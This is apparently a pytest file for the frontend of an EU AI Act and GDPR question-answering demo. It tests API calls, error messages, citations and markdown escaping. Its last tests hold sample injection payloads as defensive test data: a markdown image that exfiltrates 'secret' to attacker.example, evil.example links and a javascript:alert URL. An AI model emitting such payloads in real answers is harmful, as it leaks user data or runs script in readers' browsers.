import re
from pathlib import Path

import httpx
import pytest
from streamlit.testing.v1 import AppTest

from assistant import ui
from assistant.models import Answer

APP_PATH = Path(__file__).resolve().parent.parent / "app" / "streamlit_app.py"

CITATION = {
    "regulation": "AI_ACT",
    "type": "article",
    "number": "6",
    "paragraph": "2",
    "title": "Classification rules for high-risk AI systems",
    "source_url": "https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32024R1689#art_6",
    "language": "en",
}
ANSWER = {
    "answer": "Annex III systems are high-risk [1].",
    "language": "en",
    "citations": [CITATION],
    "refused": False,
    "latency_ms": 1234,
    "input_tokens": 900,
    "output_tokens": 80,
}
REFUSAL = {
    **ANSWER,
    "answer": "This question is not covered by the text of the EU AI Act or the GDPR.",
    "citations": [],
    "refused": True,
}


def client_for(handler) -> httpx.Client:
    return httpx.Client(transport=httpx.MockTransport(handler), base_url="http://api")


def json_client(status: int, body) -> httpx.Client:
    return client_for(lambda request: httpx.Response(status, json=body))


def test_ask_success_returns_answer():
    result = ui.ask("Is a CV filter high-risk?", client=json_client(200, ANSWER))
    assert result.error is None
    assert result.answer.citations[0].label == "AI Act Art. 6(2)"


def test_ask_sends_question_to_ask_endpoint():
    seen = {}

    def handler(request):
        seen["path"] = request.url.path
        seen["body"] = request.content
        return httpx.Response(200, json=ANSWER)

    ui.ask("Hello?", client=client_for(handler))
    assert seen["path"] == "/ask"
    assert b"Hello?" in seen["body"]


def test_ask_forwards_x_forwarded_for_when_given():
    seen = {}

    def handler(request):
        seen["xff"] = request.headers.get("x-forwarded-for")
        return httpx.Response(200, json=ANSWER)

    ui.ask("Hello?", client=client_for(handler), forwarded_for="203.0.113.7, 10.0.0.1")
    assert seen["xff"] == "203.0.113.7, 10.0.0.1"


def test_ask_omits_x_forwarded_for_when_none():
    seen = {}

    def handler(request):
        seen["has"] = "x-forwarded-for" in request.headers
        return httpx.Response(200, json=ANSWER)

    ui.ask("Hello?", client=client_for(handler))
    assert seen["has"] is False


def test_citation_links_are_markdown_with_title():
    links = ui.citation_links(Answer(**ANSWER))
    assert links == [
        "[AI Act Art. 6(2)](" + CITATION["source_url"] + ") - "
        "Classification rules for high\\-risk AI systems (EN)"
    ]


def test_refused_answer_has_no_sources():
    result = ui.ask("Weather?", client=json_client(200, REFUSAL))
    assert result.answer.refused
    assert ui.citation_links(result.answer) == []


@pytest.mark.parametrize(
    "status, body, expected",
    [
        (422, {"detail": "The question must not be empty."}, "The question must not be empty."),
        (
            422,
            {"detail": [{"msg": "String should have at most 1000 characters"}]},
            "String should have at most 1000 characters",
        ),
        (
            429,
            {"detail": "Too many questions, please try again later."},
            "Too many questions, please try again later.",
        ),
        (
            429,
            {"detail": "The demo has reached its daily limit, please try again tomorrow."},
            "The demo has reached its daily limit, please try again tomorrow.",
        ),
        (
            503,
            {"detail": "The demo has reached its usage limit, please try again later."},
            "The demo has reached its usage limit, please try again later.",
        ),
        (500, {"detail": "boom"}, ui.GENERIC_ERROR),
    ],
)
def test_error_statuses_become_friendly_messages(status, body, expected):
    result = ui.ask("q", client=json_client(status, body))
    assert result.answer is None
    assert result.error == expected


def test_non_json_error_body_is_generic():
    client = client_for(lambda request: httpx.Response(502, text="<html>bad gateway</html>"))
    assert ui.ask("q", client=client).error == ui.GENERIC_ERROR


def test_connection_error_is_friendly():
    def handler(request):
        raise httpx.ConnectError("refused")

    result = ui.ask("q", client=client_for(handler))
    assert (
        result.error == "The service is starting up or unavailable, please try again in a minute."
    )


def test_text_as_of_from_health():
    body = {"status": "ok", "text_as_of": "AI Act 2026-07-27; GDPR 2016-05-04", "chunks": 3044}
    assert ui.get_text_as_of(client=json_client(200, body)) == "AI Act 2026-07-27; GDPR 2016-05-04"


def test_text_as_of_unknown_when_health_fails():
    def handler(request):
        raise httpx.ConnectError("refused")

    assert ui.get_text_as_of(client=client_for(handler)) == "unknown"
    assert ui.get_text_as_of(client=json_client(500, {})) == "unknown"


def test_footer_has_the_four_notices():
    footer = ui.footer("unknown")
    for text in (
        "Not legal advice.",
        "Do not enter personal data.",
        "This demo is quota-limited.",
        "Text as of: unknown",
    ):
        assert text in footer


def test_caption_shows_latency_and_tokens():
    assert ui.caption(Answer(**ANSWER)) == "1.2 s · 900 input / 80 output tokens"


def test_example_questions_two_de_two_en():
    assert [lang for lang, _ in ui.EXAMPLES] == ["DE", "DE", "EN", "EN"]


@pytest.fixture
def app(monkeypatch):
    monkeypatch.setattr(
        ui, "get_text_as_of", lambda client=None: "AI Act 2026-07-27; GDPR 2016-05-04"
    )
    return AppTest.from_file(str(APP_PATH), default_timeout=10)


def test_page_shows_title_and_notices(app):
    app.run()
    assert not app.exception
    assert app.title[0].value == "EU AI Act & GDPR Assistant"
    footer = " ".join(c.value for c in app.caption)
    for text in (
        "Not legal advice.",
        "Do not enter personal data.",
        "This demo is quota-limited.",
        "Text as of: AI Act 2026-07-27",
    ):
        assert text in footer


def test_example_question_renders_answer_with_citation_link(app, monkeypatch):
    monkeypatch.setattr(ui, "ask", lambda q, client=None, forwarded_for=None: ui.AskResult(answer=Answer(**ANSWER)))
    app.run()
    next(b for b in app.button if b.label == ui.EXAMPLES[2][1]).click().run()
    assert not app.exception
    assert any("Annex III systems are high\\-risk [1]" in m.value for m in app.markdown)
    assert any("[AI Act Art. 6(2)](" + CITATION["source_url"] in m.value for m in app.markdown)


def test_error_is_shown_as_message(app, monkeypatch):
    monkeypatch.setattr(
        ui,
        "ask",
        lambda q, client=None, forwarded_for=None: ui.AskResult(error="Too many questions, please try again later."),
    )
    app.run()
    app.text_input[0].set_value("anything")
    app.get("form_submit_button")[0].click().run()
    assert app.error[0].value == "Too many questions, please try again later."


def unescaped_specials(out: str) -> list[str]:
    """Markdown control characters not preceded by a backslash (markers [n] excepted)."""
    out = re.sub(r"\[\d+\]", "", out)
    return re.findall(r"(?<!\\)[!\[\]()<>:*_`]", out)


def test_answer_image_injection_neutralised():
    out = ui.safe_answer_markdown("Hi ![x](https://attacker.example/?q=secret) [1]")
    assert unescaped_specials(out) == []
    assert "\\!\\[x\\]\\(" in out


def test_answer_link_injection_neutralised():
    out = ui.safe_answer_markdown(
        "[click](https://evil.example) <a href='x'>y</a> https://evil.example"
    )
    assert unescaped_specials(out) == []


def test_citation_markers_preserved():
    assert "Rule applies [1] and [12]" in ui.safe_answer_markdown("Rule applies [1] and [12].")


def test_german_text_and_newlines_read_fine():
    out = ui.safe_answer_markdown("Die Pflicht gilt für Übermittlungen [1].\nZweite Zeile: äöüß")
    assert "Die Pflicht gilt für Übermittlungen [1]" in out
    assert "  \n" in out and "äöüß" in out


def _citation(url, title="T"):
    return Answer(**{**ANSWER, "citations": [{**CITATION, "source_url": url, "title": title}]})


def test_non_eurlex_url_not_linked():
    line = ui.citation_links(_citation("https://evil.example/eur-lex.europa.eu"))[0]
    assert "](" not in line and "AI Act Art" in line
    assert "](" not in ui.citation_links(_citation("http://eur-lex.europa.eu/x"))[0]
    assert "](" not in ui.citation_links(_citation("https://eur-lex.europa.eu.evil.example/x"))[0]


def test_javascript_url_not_linked():
    assert "](" not in ui.citation_links(_citation("javascript:alert(1)"))[0]
    assert (
        "](" not in ui.citation_links(_citation("https://eur-lex.europa.eu/x) [y](https://evil"))[0]
    )


def test_title_markdown_escaped():
    line = ui.citation_links(_citation(CITATION["source_url"], "![a](https://evil.example) *b*"))[0]
    assert "![" not in line.split(") - ", 1)[1] and "](" not in line.split(") - ", 1)[1]
